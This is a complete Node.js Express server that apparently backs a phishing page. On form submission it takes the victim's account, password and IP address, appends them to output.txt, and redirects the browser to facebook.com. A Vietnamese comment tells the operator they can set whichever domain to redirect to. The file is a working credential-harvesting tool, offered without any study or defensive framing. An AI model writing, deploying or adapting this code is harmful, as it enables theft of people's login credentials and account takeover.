const express = require("express");
const bodyParser = require("body-parser")
const fs = require('fs')
// New app using express module
const app = express();
app.use(bodyParser.urlencoded({
    extended: true
}));

app.get("/", function (req, res) {
    res.sendFile(__dirname + "/index.html");
});

app.post("/", function (req, res) {
    var num1 = String(req.body.Account);
    var num2 = String(req.body.Password);
    var iptest = String(req.body.soip)

    var result = iptest+"|"+num1 +"|"+ num2;
    

    let data = result+"\n"
    fs.writeFile('output.txt', data,{ flag: 'a+' }, (err) => {
    if (err) throw err;
    });
    res.statusCode = 302;
    res.setHeader("Location", "https://www.facebook.com/"); //thì ở đây ông có thể set tên miền ông cần hướng tới
    res.end();
});

app.listen(3000,"0.0.0.0", function () {
    console.log("server is running on port 3000");
})
